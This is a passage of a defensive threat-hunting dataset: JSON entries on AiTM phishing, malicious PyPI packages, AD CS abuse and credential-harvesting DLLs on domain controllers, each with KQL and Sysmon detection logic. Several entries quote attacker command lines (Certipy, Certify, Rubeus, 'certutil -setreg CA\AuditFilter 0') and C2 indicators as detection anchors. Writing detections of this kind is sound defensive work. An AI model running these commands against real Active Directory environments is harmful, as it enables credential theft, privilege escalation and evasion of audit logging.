    "why": "- This campaign hit ~35,000 users across 13,000 organizations in 26 countries (92% US-based) per Microsoft's May 2026 disclosure — Healthcare, Financial Services, and Professional Services are the top targets, all sectors with regulatory-themed lure susceptibility\n- AiTM token theft renders MFA ineffective — once the session cookie is stolen, the attacker bypasses MFA entirely on every subsequent service hit; detecting at the click-through-to-anomalous-sign-in window is the last reliable layer before mailbox compromise\n- The Cloudflare CAPTCHA + image-selection CAPTCHA double-gate is specifically designed to defeat sandbox detonation and URL-rewrite scanning — defenders cannot rely on inline URL inspection, only on post-click identity telemetry\n- The \"code of conduct\" / regulatory-compliance lure theme is novel and effective against compliance-aware industries (healthcare, financial services) — it is likely to recur across multiple operator clusters in 2026, and a generalized hunt on the click→risk-event sequence will catch follow-on variants regardless of sender domain rotation",
    "references": "- [MITRE ATT&CK T1539 - Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539/)\n- [Microsoft Threat Intelligence - Breaking the Code: Multi-Stage 'Code of Conduct' Phishing Campaign Leads to AiTM Token Compromise](https://www.microsoft.com/en-us/security/blog/2026/05/04/breaking-the-code-multi-stage-code-of-conduct-phishing-campaign-leads-to-aitm-token-compromise/)\n- [MITRE ATT&CK T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)\n- [Microsoft - Anomalous Token Detection in Entra ID Protection](https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks)\n- [Microsoft - Impossible Travel Detection in Defender for Cloud Apps](https://learn.microsoft.com/en-us/defender-cloud-apps/anomaly-detection-policy)\n- [Mandiant - Tycoon 2FA / AiTM Phishing-as-a-Service Analysis](https://cloud.google.com/blog/topics/threat-intelligence/tycoon2fa)\n- [Microsoft Sentinel - Hunting Queries for AiTM Phishing](https://github.com/Azure/Azure-Sentinel/tree/master/Hunting%20Queries/MicrosoftThreatProtection)",
    "file_path": "Flames/H149.md"
  },
  {
    "id": "H150",
    "category": "Flames",
    "title": "Threat actors deliver Python supply-chain malware via PyPI packages (colorinal/termncolor/uuid32-utils) that load an attacker-controlled native DLL on import, drop a payload to %LOCALAPPDATA%\\vcpacket\\, and persist via an HKCU Run key.",
    "tactic": "Initial Access",
    "notes": "Windows. OceanLotus / APT32 (Securelist, May 2026) — three malicious wheels on PyPI starting July 2025. Detection: Sysmon Event ID 7 — flag `python.exe`/`pythonw.exe` loading DLLs from `site-packages\\colorinal\\`, `site-packages\\termncolor\\`, `site-packages\\uuid32-utils\\`, or any non-stdlib site-packages path that is not on the org's pip-install allowlist; Sysmon Event ID 1 for `python.exe` parent of `vcpktsvr.exe`; Sysmon Event ID 11 for file creates under `%LOCALAPPDATA%\\vcpacket\\`; Sysmon Event ID 13 for `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\pkt-update` Set; Sysmon Event ID 3 / `DeviceNetworkEvents` for outbound HTTPS to `helper.zulipchat.com` from `vcpktsvr.exe`. KQL: `DeviceImageLoadEvents | where InitiatingProcessFileName in~ (\"python.exe\",\"pythonw.exe\") and FileName endswith \".dll\" | where FolderPath has \"site-packages\" and FolderPath !has_any (\"\\\\numpy\\\\\",\"\\\\pandas\\\\\",\"\\\\cryptography\\\\\",\"\\\\lxml\\\\\",\"\\\\pillow\\\\\",\"\\\\torch\\\\\")`. KQL persistence: `DeviceRegistryEvents | where RegistryKey has \"CurrentVersion\\\\Run\" and RegistryValueName == \"pkt-update\"`. Cross-reference T1059.006 (Python) — the entire dropper chain runs inside the Python interpreter.",
    "tags": [
      "initial_access",
      "pypi",
      "supply_chain",
      "oceanlotus",
      "apt32",
      "zichatbot",
      "T1059.006",
      "T1195.002"
    ],
    "techniques": [
      "T1059.006",
      "T1195.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Python interpreters loading native DLLs from inside site-packages directories is rare for the typical engineering workstation outside a small set of known-native libraries (numpy, pandas, cryptography, lxml, pillow, torch) — this hunt reliably surfaces unfamiliar wheels with C extensions\n- OceanLotus (APT32) using PyPI as a malware delivery channel — confirmed by Kaspersky in May 2026 — represents a meaningful upgrade in supply-chain targeting from a state-aligned actor; expect more APT entrants to mirror this technique through 2026\n- Zulip team-chat APIs are a novel C2 channel that bypasses domain-reputation and threat-intel feeds entirely (helper.zulipchat.com is a legitimate cloud service) — defenders cannot rely on URL/domain blocklists; the host-side Run-key + native DLL combo is the durable signal\n- Developer workstations and CI/CD runners are typically less monitored than user endpoints and have credentials, source code, and cloud-provider tokens — supply-chain compromise via PyPI yields outsized impact, justifying tighter Sysmon coverage there",
    "references": "- [MITRE ATT&CK T1195.002 - Supply Chain Compromise: Compromise Software Supply Chain](https://attack.mitre.org/techniques/T1195/002/)\n- [Securelist (Kaspersky) - OceanLotus Suspected of Using PyPI to Deliver ZiChatBot Malware](https://securelist.com/oceanlotus-suspected-pypi-zichatbot-campaign/119603/)\n- [MITRE ATT&CK T1059.006 - Command and Scripting Interpreter: Python](https://attack.mitre.org/techniques/T1059/006/)\n- [Snyk - Malicious Packages Found to Be Typosquatting in PyPI](https://snyk.io/blog/malicious-packages-found-to-be-typo-squatting-in-pypi/)\n- [Check Point - PyPI Inundated by Malicious Typosquatting Campaign](https://blog.checkpoint.com/securing-the-cloud/pypi-inundated-by-malicious-typosquatting-campaign/)\n- [Socket - Typosquatting on PyPI: Malicious Package Mimics Popular Browser-Cookie Library](https://socket.dev/blog/typosquatting-on-pypi-malicious-package-mimics-popular-browser-cookie-library)\n- [SigmaHQ - Suspicious Python DLL Load](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_python_susp_module.yml)",
    "file_path": "Flames/H150.md"
  },
  {
    "id": "H151",
    "category": "Flames",
    "title": "Silver Fox persists ABCDoor on Windows via an HKCU Run key value \"AppClient\" and a Scheduled Task \"AppClient\" both invoking `pythonw.exe -m appclient`, with installation artifacts under HKCU\\Software\\CarEmu and %LOCALAPPDATA%\\applogs.",
    "tactic": "Persistence",
    "notes": "Windows. Silver Fox APT tax-notification campaign targeting Russia and India (Securelist, April–May 2026). Detection: Sysmon Event ID 13 / `DeviceRegistryEvents` for Set on `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AppClient`; Sysmon Event ID 1 / Windows Event ID 4698 (Scheduled Task created) for task name `AppClient` with action `pythonw.exe -m appclient`; Sysmon Event ID 11 for file creates in `%LOCALAPPDATA%\\applogs\\device.log` and `exception_logs.zip`; Sysmon Event ID 13 for Set on `HKCU\\Software\\CarEmu\\FirstInstallTime` or `InstallChannel`; Sysmon Event ID 3 / `DeviceNetworkEvents` for outbound HTTPS to `abc.*` C2 domains and `45.118.133[.]205:5000`. KQL: `DeviceProcessEvents | where FileName =~ \"pythonw.exe\" and ProcessCommandLine has \"-m appclient\"`. KQL Run key: `DeviceRegistryEvents | where RegistryKey has \"CurrentVersion\\\\Run\" and RegistryValueName == \"AppClient\" and RegistryValueData has \"pythonw.exe\"`. KQL Scheduled Task: `DeviceProcessEvents | where FileName =~ \"schtasks.exe\" and ProcessCommandLine has_all (\"/Create\",\"AppClient\",\"pythonw\")`. Cross-reference T1053.005 (Scheduled Task) — both persistence anchors should be hunted together. Cross-reference T1574.002 (DLL Side-Loading) — Silver Fox's loader chain uses RustSL with sideloaded `登录模块.dll_bin` ValleyRAT components.",
    "tags": [
      "persistence",
      "windows",
      "silver_fox",
      "abcdoor",
      "valleyrat",
      "T1053.005",
      "T1574.002",
      "T1547.001"
    ],
    "techniques": [
      "T1053.005",
      "T1574.002",
      "T1547.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- pythonw.exe running with `-m appclient` is virtually never benign on a corporate Windows endpoint — most environments have no legitimate Python application named `appclient`, making the command line a single-string anchor that catches the technique with near-zero false positives\n- Silver Fox is targeting industrial, consulting, retail, and transportation organizations across two strategic countries (Russia, India) with >1,600 phishing emails in a single window — defenders in those verticals should treat this as an active, high-volume threat\n- Dual persistence (Run key + Scheduled Task with a 1-minute trigger) is unusually aggressive — the Scheduled Task respawns the implant if the user kills it, and the every-minute trigger generates Event ID 4688 noise that defenders can pivot from once they know the binary\n- The ABCDoor implant inherits its \"remote control\" primitives from ValleyRAT (broad screen capture and HID emulation) but lacks a remote shell — defenders can rely on persistence and beacon detection rather than command-execution telemetry, which is unusual and instructive for tooling decisions",
    "references": "- [MITRE ATT&CK T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)\n- [Securelist (Kaspersky) - Silver Fox Uses the New ABCDoor Backdoor to Target Organizations in Russia and India](https://securelist.com/silver-fox-tax-notification-campaign/119575/)\n- [MITRE ATT&CK T1053.005 - Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)\n- [Red Canary Atomic Red Team - T1547.001 Registry Run Keys](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md)\n- [Elastic Detection Rules - Persistence via Scheduled Task](https://www.elastic.co/guide/en/security/current/persistence-via-scheduled-job-creation.html)\n- [SigmaHQ - Suspicious Run Key from Download](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_set/registry_set_run_key_susp_download.yml)\n- [Splunk - Hunting for Scheduled Task Persistence](https://www.splunk.com/en_us/blog/security/hunting-for-malicious-scheduled-tasks.html)",
    "file_path": "Flames/H151.md"
  },
  {
    "id": "H152",
    "category": "Flames",
    "title": "Threat actors register attacker-controlled key credentials in `msDS-KeyCredentialLink` on privileged AD user/computer objects (Whisker, pyWhisker, Certipy `shadow auto`) to obtain a persistent passwordless PKINIT authentication primitive that survives password resets.",
    "tactic": "Credential Access",
    "notes": "Windows / Active Directory. Unit 42 AD CS exploitation report (May 2026) called shadow credentials out as a primary persistence/escalation primitive paired with AD CS abuse. Detection: Windows Security Event ID 5136 (directory object modified) with `AttributeLDAPDisplayName == \"msDS-KeyCredentialLink\"` — by default this is not audited for user objects, so a custom AuditRule for the attribute GUID must be deployed first; exclude legitimate writers (Azure AD Connect `MSOL_*`, ADFS service account, Windows Hello for Business enrollment service). Sysmon Event ID 1 / `DeviceProcessEvents` for `Whisker.exe`, `Rubeus.exe asktgt`, or `certipy shadow auto`/`certipy auth -pfx`. Cross-reference T1556 (Modify Authentication Process) — the msDS-KeyCredentialLink write is the auth-process modification. Cross-reference T1550 (Use Alternate Authentication Material) — the follow-on PKINIT TGT request uses the shadow credential. KQL: `IdentityDirectoryEvents | where ActionType == \"Directory object modified\" and AdditionalFields has \"msDS-KeyCredentialLink\" and AccountName !startswith \"MSOL_\"`. Sigma: SigmaHQ `win_security_susp_possible_shadow_credentials_added.yml`.",
    "tags": [
      "credential_access",
      "shadow_credentials",
      "ad_cs",
      "windows",
      "T1556",
      "T1550",
      "T1649"
    ],
    "techniques": [
      "T1556",
      "T1550",
      "T1649"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Shadow credentials are an EDR-resistant persistence primitive: the attacker never touches LSASS, never extracts a hash, and never needs the user's password — they simply append a key to the target's `msDS-KeyCredentialLink` and authenticate via PKINIT, so credential-theft and password-rotation controls do nothing\n- The technique is now a default option in Certipy (`shadow auto`, baked into the AD CS toolchain) and Unit 42's May 2026 report flags it as paired with ESC1-ESC16 abuse — meaning operators with AD CS access will almost always set a shadow credential as their persistence anchor\n- Detection requires explicit configuration of a custom Directory Service AuditRule for the `msDS-KeyCredentialLink` attribute (GUID `5b47d60f-6090-40b2-9f37-2a4de88f3063`) because the default audit policy doesn't cover this attribute on user objects — so most environments have ZERO visibility today, and even adding the audit rule is a high-value defensive win\n- Legitimate writers are a small allowlist (Azure AD Connect `MSOL_*`, ADFS svc, Windows Hello for Business enrollment) — once excluded, residual 5136 events on this attribute become extremely high signal",
    "references": "- [MITRE ATT&CK T1649 - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)\n- [Unit 42 - Inside AD CS Escalation: Unpacking Advanced Misuse Techniques and Tools](https://unit42.paloaltonetworks.com/active-directory-certificate-services-exploitation/)\n- [MITRE ATT&CK T1556 - Modify Authentication Process](https://attack.mitre.org/techniques/T1556/)\n- [SigmaHQ - Possible Shadow Credentials Added (5136 + msDS-KeyCredentialLink)](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/security/win_security_susp_possible_shadow_credentials_added.yml)\n- [Elastic Prebuilt Detection - Potential Shadow Credentials added to AD Object](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/credential_access_shadow_credentials)\n- [Black Hills InfoSec - Enable Auditing of Changes to msDS-KeyCredentialLink](https://www.blackhillsinfosec.com/enable-auditing-of-changes-to-msds-keycredentiallink/)\n- [DefensiveOrigins - Detect-msDS-KeyCredentialLink (audit rule deployment)](https://github.com/DefensiveOrigins/Detect-msDS-KeyCredentialLink)",
    "file_path": "Flames/H152.md"
  },
  {
    "id": "H153",
    "category": "Flames",
    "title": "Threat actors are exploiting ESC1-vulnerable certificate templates (`ENROLLEE_SUPPLIES_SUBJECT` + Client Authentication EKU + low/empty approval requirements) via Certify or Certipy to request a certificate with an arbitrary Subject Alternative Name impersonating a privileged account, then authenticating to a DC via PKINIT.",
    "tactic": "Privilege Escalation",
    "notes": "Windows / Active Directory. Unit 42 AD CS exploitation report (May 2026). Detection requires CA-level audit logging enabled (`certutil -setreg CA\\AuditFilter 127` + OS-level \"Audit Certification Services\" success/failure). Hunt: Windows Security Event ID 4886 (cert request received) and 4887 (cert issued) on the CA — flag any certificate where the SAN UPN/DNS name does NOT match the requester account; correlate within minutes to Windows Event ID 4768 on a DC with `PreAuthType == 16` (PKINIT) and `TicketOptions` starting `0x4080` for the impersonated account from a host that does not normally authenticate as that account. Sysmon Event ID 1 for `Certify.exe request /ca:.. /template:.. /altname:..`, `certipy req`, or `Rubeus asktgt /certificate:`. KQL (Defender XDR): join `DeviceProcessEvents` on certify/certipy invocations with `IdentityLogonEvents` PKINIT TGT requests for the SAN'd identity. Cross-reference T1649 (Steal or Forge Authentication Certificates) parent technique. Cross-reference T1550 (Use Alternate Authentication Material) for the TGT request follow-on. Splunk Security Content: `Windows Steal Authentication Certificates - ESC1 Abuse` and `ESC1 Authentication`.",
    "tags": [
      "privilege_escalation",
      "esc1",
      "ad_cs",
      "certify",
      "certipy",
      "windows",
      "T1649",
      "T1550"
    ],
    "techniques": [
      "T1649",
      "T1550"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- ESC1 is the highest-impact AD CS misconfiguration that still ships in many environments — a single template with `ENROLLEE_SUPPLIES_SUBJECT` + a broad enrollment ACL is a direct path from low-privileged domain user to Domain Admin, and Unit 42 reported active exploitation in May 2026\n- The mismatch between requester identity and SAN is a near-zero-FP anchor — a legitimate cert request issued for `alice@corp.local` should be requested by `alice`, not by `bob`; a deviation is virtually always abuse or misconfiguration that warrants investigation either way\n- Most environments do NOT enable AD CS audit logging by default — establishing the hunt forces the prerequisite work of turning on `4886`/`4887` and the OS-level CertSvc audit subcategory, which is a defensive win independent of catching this specific attacker\n- The Certify and Certipy toolchain leaves distinctive command-line patterns (`/altname:`, `/upn:`, `req --upn`) that survive renames; combined with the SAN-vs-requester mismatch this becomes a robust, multi-signal hunt",
    "references": "- [MITRE ATT&CK T1649 - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)\n- [Unit 42 - Inside AD CS Escalation: Unpacking Advanced Misuse Techniques and Tools](https://unit42.paloaltonetworks.com/active-directory-certificate-services-exploitation/)\n- [Splunk Security Content - Windows Steal Authentication Certificates - ESC1 Abuse](https://research.splunk.com/endpoint/cbe761fc-d945-4c8c-a71d-e26d12255d32/)\n- [Splunk Security Content - ESC1 Authentication](https://research.splunk.com/endpoint/f0306acf-a6ab-437a-bbc6-8628f8d5c97e/)\n- [Splunk Security Content - Windows Steal Authentication Certificates Certificate Issued (SAN)](https://research.splunk.com/endpoint/9b1a5385-0c31-4c39-9753-dc26b8ce64c2/)\n- [Lares Labs - Common ADCS Vulnerabilities: Logging, Exploitation, and Investigation (Part 2)](https://labs.lares.com/adcs-exploits-investigations-pt2/)\n- [Semperis - ESC1 Attack Explained](https://www.semperis.com/blog/esc1-attack-explained/)",
    "file_path": "Flames/H153.md"
  },
  {
    "id": "H154",
    "category": "Flames",
    "title": "Threat actors with local-admin access to an Enterprise CA host are modifying `HKLM\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\<CAName>\\AuditFilter` (via `certutil -setreg CA\\AuditFilter 0` or direct reg write) to silence Certificate Services events 4886/4887/4898 before performing ESC1-ESC16 abuse.",
    "tactic": "Defense Evasion",
    "notes": "Windows / Active Directory CA hosts. Unit 42 AD CS exploitation report (May 2026) calls out CA audit policy tampering as a precursor to certificate forgery. Detection: Windows Security Event ID 4885 (\"The audit filter for Certificate Services changed\") fires whenever the CA Audit tab is modified — this is a tier-zero alert. Sysmon Event ID 13 (RegistryEvent SetValue) on `HKLM\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\*\\AuditFilter` with new value != 127 (127 = all categories audited). Sysmon Event ID 1 / `DeviceProcessEvents` for `certutil.exe -setreg CA\\AuditFilter`. Windows Security Event ID 4719 (system audit policy changed) and 4906/4907 (SACL changed). Cross-reference T1070 (Indicator Removal) — the goal is destroying evidence of subsequent cert abuse. Cross-reference T1649 (Steal or Forge Authentication Certificates) — this hunt is the precursor; pair with H153 (ESC1) for end-to-end coverage. KQL: `DeviceRegistryEvents | where RegistryKey has \"CertSvc\\\\Configuration\" and RegistryValueName =~ \"AuditFilter\" and RegistryValueData != \"127\"`.",
    "tags": [
      "defense_evasion",
      "ad_cs",
      "certutil",
      "windows",
      "T1070",
      "T1649",
      "T1562.002"
    ],
    "techniques": [
      "T1070",
      "T1649",
      "T1562.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- CA audit logging is the single source of truth for AD CS abuse — without `4886`/`4887`/`4898` defenders cannot see who requested what certificate with which SAN — so tampering with `AuditFilter` is the prerequisite step a sophisticated AD CS attacker takes before forging certificates\n- Legitimate changes to the AuditFilter are rare and almost always come from a known CA administrator during planned configuration — any modification outside a change window is suspect and warrants pager-grade response\n- Event ID **4885** is a built-in, single-event detection for this exact behavior that ships with Windows but is rarely alerted on — building this hunt is a low-cost, high-value defensive win that catches every variation of the technique (certutil, direct registry, GPO push) without needing to enumerate the toolchain\n- Many environments never enable CA audit logging in the first place — running this hunt surfaces hosts where `AuditFilter` is permanently set below `127`, which is a configuration finding worth fixing even if no adversary touched it",
    "references": "- [MITRE ATT&CK T1562.002 - Impair Defenses: Disable Windows Event Logging](https://attack.mitre.org/techniques/T1562/002/)\n- [Unit 42 - Inside AD CS Escalation: Unpacking Advanced Misuse Techniques and Tools](https://unit42.paloaltonetworks.com/active-directory-certificate-services-exploitation/)\n- [Ultimate Windows Security - Event ID 4885: The audit filter for Certificate Services changed](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4885)\n- [PKI Solutions - Enabling Active Directory Certificate Services (ADCS) Advanced Audit](https://www.pkisolutions.com/enabling-active-directory-certificate-services-adcs-advanced-audit/)\n- [Encryption Consulting - How to Enable Certification Authority Advanced Filter](https://www.encryptionconsulting.com/how-to-enable-certification-authority-advanced-audit-filter/)\n- [Heirhabarov - Hunting for Active Directory Certificate Services Abuse (Speaker Deck)](https://speakerdeck.com/heirhabarov/hunting-for-active-directory-certificate-services-abuse)\n- [JUMPSEC Labs - Active Directory Certificate Service Defensive Guidance](https://labs.jumpsec.com/active-directory-certificate-service-defensive-guidance/)",
    "file_path": "Flames/H154.md"
  },
  {
    "id": "H155",
    "category": "Flames",
    "title": "Threat actors are submitting stolen or forged user certificates (from ESC1 abuse, shadow credentials, or extracted PFX) to a Domain Controller via PKINIT — appearing as Kerberos TGT requests with `PreAuthType=16` and `TicketOptions=0x40810010` from hosts that do not normally authenticate as that user.",
    "tactic": "Lateral Movement",
    "notes": "Windows / Active Directory. Unit 42 AD CS exploitation report (May 2026) maps cert-based TGT requests to T1550. Detection: Windows Security Event ID 4768 on every DC with `Certificate Information` fields populated (`CertIssuerName`, `CertSerialNumber`, `CertThumbprint`) AND `PreAuthType == 16` (PKINIT) AND `TicketOptions` starting `0x4080` — baseline expected sources (Windows Hello for Business endpoints, smartcard-enabled admins, ADFS) and alert on outliers, especially TGT requests for privileged accounts (Domain Admins, Enterprise Admins, service accounts with high-value SPNs) from non-typical hosts. Sysmon Event ID 1 / `DeviceProcessEvents` for `Rubeus.exe asktgt /certificate:` or `certipy auth -pfx`. KQL (Defender XDR): `IdentityLogonEvents | where Protocol == \"Kerberos\" and LogonType == \"PKINIT\"` joined to `DeviceLogonEvents` on `AccountUpn` and time-window. Cross-reference T1649 (the cert was stolen or forged) and T1556 (shadow credentials enabled the PKINIT) — pair with H152 and H153. Note: Windows Hello for Business produces high-volume legitimate PKINIT TGTs — baseline by `IpAddress` and device first.",
    "tags": [
      "lateral_movement",
      "pkinit",
      "kerberos",
      "ad_cs",
      "windows",
      "T1550",
      "T1649",
      "T1556"
    ],
    "techniques": [
      "T1550",
      "T1649",
      "T1556"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- PKINIT abuse is the \"use\" half of AD CS attack chains — the forge/steal step (T1649) gets defensive attention but the TGT-request step is where the attacker actually pivots, and most SOCs don't watch `4768 PreAuthType=16` because PreAuthType 16 is also produced by every Windows Hello for Business logon\n- Unlike kerberoasting or AS-REP roasting, PKINIT abuse leaves a clean audit trail in the certificate fields on `4768` — `CertIssuerName`, `CertSerialNumber`, `CertThumbprint` — that maps directly back to the issued cert and can be correlated to the `4887` issuance event from H153 to build a full attack timeline\n- After baseline PKINIT noise is excluded, a PKINIT TGT for `Administrator` or `krbtgt` or a Tier 0 service account is virtually always an attack — the baseline work pays for itself the first time the hunt fires\n- This hunt is the canonical example of a cross-event-source hunt: cert issuance (CA host), key registration (DC `5136` for shadow creds), and TGT request (DC `4768`) live on different hosts and must be correlated — building it forces SOC pipelines to ingest all three sources",
    "references": "- [MITRE ATT&CK T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/)\n- [Unit 42 - Inside AD CS Escalation: Unpacking Advanced Misuse Techniques and Tools](https://unit42.paloaltonetworks.com/active-directory-certificate-services-exploitation/)\n- [Securelist - Anomaly Detection in Certificate-Based TGT Requests](https://securelist.com/anomaly-detection-in-certificate-based-tgt-requests/110242/)\n- [SOC Stories - Detecting ADCS Attacks](https://www.socstories.blog/detecting-adcs-attacks/)\n- [Microsoft Learn - Event 4768: A Kerberos authentication ticket (TGT) was requested](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)\n- [Lares Labs - Kerberos II: Credential Access (PKINIT & Rubeus asktgt)](https://labs.lares.com/fear-kerberos-pt2/)\n- [Noah H - Offensive Kerberos Techniques for Detection Engineering](https://medium.com/@noah_h/offensive-kerberos-techniques-for-detection-engineering-16a81483f676)",
    "file_path": "Flames/H155.md"
  },
  {
    "id": "H156",
    "category": "Flames",
    "title": "Threat actors are registering a malicious Network Provider DLL (e.g., `mslogon.dll`) at `HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc>\\NetworkProvider\\ProviderPath` on a Domain Controller — letting Windows invoke `NPLogonNotify` / `NPPasswordChangeNotify` on every interactive logon and password change to harvest cleartext credentials.",
    "tactic": "Credential Access",
    "notes": "Windows / Domain Controllers. Microsoft Threat Intelligence trust-boundary intrusion report (May 2026, third-party HPOM compromise). Detection (KQL verbatim from Microsoft): `DeviceRegistryEvents | where RegistryKey has_all (@'\\Services\\', @'\\NetworkProvider')`. Windows Security Event ID 7045 (a service was installed) for unfamiliar service names with an associated `NetworkProvider` subkey; Event ID 4657 on `\\Services\\<name>\\NetworkProvider\\ProviderPath`; Sysmon Event ID 13 (registry SetValue) on the same path; Sysmon Event ID 7 (ImageLoad) for `mpnotify.exe` loading non-Microsoft DLLs from non-`%SystemRoot%\\System32` paths. Baseline: legitimate providers are short (`LanmanWorkstation`, `RDPNP`, `webclient`); any new entry is high signal — and a new entry on a Domain Controller is almost never legitimate. Cross-reference T1556.002 (Password Filter DLL) — adversaries often install both for redundancy (pair with H157). Cross-reference T1199 (Trusted Relationship) — Microsoft's intrusion entered via a trusted third-party IT provider.",
    "tags": [
      "credential_access",
      "network_provider",
      "lsa",
      "domain_controller",
      "windows",
      "T1556.002",
      "T1199",
      "T1556.008"
    ],
    "techniques": [
      "T1556.002",
      "T1199",
      "T1556.008"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The May 2026 Microsoft Threat Intelligence report is the first major public writeup of network provider DLL credential capture used in a real intrusion — most SOC playbooks do not have a hunt for it, and the actor deliberately chose this technique BECAUSE it survives credential rotation and LSASS protections\n- `NPLogonNotify` receives cleartext credentials by API design — Windows hands them to every registered provider; there is no protection or detection at the credential-flow level, so the only defensive control is alerting on the provider registration itself\n- The legitimate set of network providers is tiny and well-known per environment (LanmanWorkstation, RDPNP, webclient, sometimes a VPN client) — a single new entry, especially on a DC, is a tier-zero alert with effectively zero false positives once a one-time baseline is captured\n- The Microsoft KQL detection is short, copy-pasteable, and covers every variant of the technique (any service name, any DLL path) because the `NetworkProvider` subkey itself is the universal signal — this is the easiest CTI-to-detection conversion in this batch",
    "references": "- [MITRE ATT&CK T1556.008 - Modify Authentication Process: Network Provider DLL](https://attack.mitre.org/techniques/T1556/008/)\n- [Microsoft Security Blog - Undermining the Trust Boundary: Investigating a Stealthy Intrusion Through Third-Party Compromise](https://www.microsoft.com/en-us/security/blog/2026/05/12/undermining-the-trust-boundary-investigating-a-stealthy-intrusion-through-third-party-compromise/)\n- [MITRE ATT&CK Detection Strategy DET0580 - Detect Network Provider DLL Registration and Credential Capture](https://attack.mitre.org/detectionstrategies/DET0580/)\n- [MITRE ATT&CK T1199 - Trusted Relationship](https://attack.mitre.org/techniques/T1199/)\n- [Praetorian - How to Detect and Dump Credentials from the Windows Registry](https://www.praetorian.com/blog/how-to-detect-and-dump-credentials-from-the-windows-registry/)\n- [SigmaHQ - Security Support Provider (SSP) Added to LSA Configuration](https://detection.fyi/sigmahq/sigma/windows/registry/registry_event/registry_event_ssp_added_lsa_config/)\n- [Red Canary Atomic Red Team - T1556.008 Network Provider DLL](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1556.008/T1556.008.md)",
    "file_path": "Flames/H156.md"
  },
  {
    "id": "H157",
    "category": "Flames",
    "title": "Threat actors are appending a malicious Password Filter DLL (e.g., `passms.dll`) to `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages` (REG_MULTI_SZ) on a Domain Controller — receiving cleartext credentials from LSA via `PasswordFilter` callbacks on every password set/change after the next reboot.",
    "tactic": "Credential Access",
    "notes": "Windows / Domain Controllers. Microsoft Threat Intelligence trust-boundary intrusion report (May 2026, third-party HPOM compromise). Detection (KQL verbatim from Microsoft): `DeviceRegistryEvents | where RegistryKey has @\"control\\LSA\" and RegistryValueName has \"Notification Packages\"`. Windows Security Event ID 4657 (registry value modified) on `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages` — requires a SACL on the key. Sysmon Event ID 13 on the same path. Sysmon Event ID 11 for file creates of unsigned DLLs in `%SystemRoot%\\System32\\` (filter must live in System32 to load). Sysmon Event ID 7 (ImageLoad) for `lsass.exe` loading any DLL not on the known-good filter list (`scecli.dll`, `rassfm.dll`, vendor password-quality DLLs). Baseline: in most environments `Notification Packages` is `scecli\\0rassfm` — any addition is high signal. Cross-reference T1556.008 (Network Provider DLL) — same actor commonly installs both for redundancy (pair with H156). Cross-reference T1547.005 (Security Support Provider) — adjacent LSA-loaded-DLL persistence with similar detection pattern.",
    "tags": [
      "credential_access",
      "lsa",
      "password_filter",
      "domain_controller",
      "windows",
      "T1556.008",
      "T1547.005",
      "T1556.002"
    ],
    "techniques": [
      "T1556.008",
      "T1547.005",
      "T1556.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Password Filter DLLs are part of the official Windows authentication architecture — Microsoft documents how to install them — so the malicious DLL runs inside LSASS with full credential access, gets cleartext passwords by API contract, and inherits LSASS's defenses against most EDR\n- The detection set is small and stable: `Notification Packages` is rarely changed by any legitimate process post-build; on a DC it's almost never changed at all, so a single 4657 / DeviceRegistryEvents hit on this value is a tier-zero alert\n- Unlike LSASS memory scraping, password filter abuse leaves NO Mimikatz-style artifact — the only telemetry is the registration event and the `lsass.exe` ImageLoad of the foreign DLL after reboot, which makes this hunt one of the very few ways to catch a post-reboot credential-capture implant\n- Microsoft's May 2026 report shows a sophisticated actor installing BOTH a password filter (`passms.dll`) AND a network provider DLL (`mslogon.dll`) on the same DC — pair this hunt with H156 to catch the full pattern, and tune both for the same allowlist of legitimate filters",
